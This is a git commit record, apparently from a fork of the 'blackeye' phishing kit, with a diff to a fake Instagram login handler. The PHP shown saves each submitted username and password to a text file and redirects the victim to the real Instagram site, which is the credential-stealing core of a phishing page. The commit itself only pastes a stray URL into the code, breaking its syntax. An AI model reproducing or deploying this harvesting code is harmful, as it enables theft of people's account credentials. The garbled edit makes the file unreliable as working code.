b80e9ae7f6b97e5aada94b09e67aba3d807f25ee
jokerman367 <58877923+jokerman367@users.noreply.github.com>
2019-12-19 20:00:46 +0700

    https://github.com/thelinuxchoice/blackeye/blob/dfcd5976ca11a19687791c44db794339c4bfa072/sites/instagram/login.html#L7

--- sites/ instagram/login.php
+++ sites/ instagram/login.php
@@ -1,5 +1,5 @@
 <?php
-
+https://github.com/thelinuxchoice/blackeye/blob/dfcd5976ca11a19687791c44db794339c4bfa072/sites/instagram/login.html#L7
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
